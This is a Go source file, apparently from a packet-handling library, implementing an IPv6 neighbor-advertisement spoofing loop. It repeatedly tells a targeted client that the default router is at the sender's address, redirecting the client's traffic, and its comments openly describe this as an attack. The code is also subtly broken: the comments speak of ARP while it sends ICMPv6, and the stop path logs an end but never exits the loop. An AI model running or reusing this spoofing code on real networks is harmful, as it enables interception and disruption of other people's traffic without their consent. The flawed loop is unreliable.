package icmp6

import (
	"fmt"
	"net"
	"time"

	"log"

	"github.com/irai/packet/raw"
)

// StartSpoofMAC performs the following:
func (h *Handler) StartSpoofMAC(mac net.HardwareAddr) error {
	if Debug {
		log.Printf("arp force IP change mac=%s", mac)
	}

	h.setHandler.Add(mac)
	go h.spoofLoop(mac)
	return nil
}

// StopSpoofMAC terminate the hunting process
func (h *Handler) StopSpoofMAC(mac net.HardwareAddr) error {
	if Debug {
		log.Printf("arp stop IP change mac=%s", mac)
	}
	h.setHandler.Del(mac) // will exit the goroutine

	return nil
}

// spoofLoop attacks the client with ARP attacks
//
// It will continuously send a number of ARP packets to client:
//   1. spoof the client arp table to send router packets to us
//   2. optionally, claim the ownership of the IP to force client to change IP or go offline
//
func (h *Handler) spoofLoop(mac net.HardwareAddr) {

	// 4 second re-do seem to be adequate;
	ticker := time.NewTicker(time.Second * 4).C
	startTime := time.Now()
	nTimes := 0
	log.Printf("icmp6 na attack mac=%s time=%v", mac, startTime)
	for {
		if h.setHandler.Index(mac) == -1 {
			log.Printf("icmp6 na attack end mac=%s time=%v", mac, time.Since(startTime))
		}
		list := h.LANHosts.FindMAC(mac)
		if len(list) == 0 {
			return
		}

		for _, v := range list {
			if raw.IsIP6(v.IP) && v.IP.IsLinkLocalUnicast() {
				if err := h.SendNeighborAdvertisement(raw.IP6DefaultRouter, raw.Addr{MAC: v.MAC, IP: v.IP}); err != nil {
					fmt.Println("icmp6 error sending na ", err)
				}
			}

			if nTimes%16 == 0 {
				log.Printf("icmp6 attack client=%s repeat=%v duration=%v", mac, nTimes, time.Now().Sub(startTime))
			}
			nTimes++

			select {
			case <-ticker:
			}
		}
	}
}
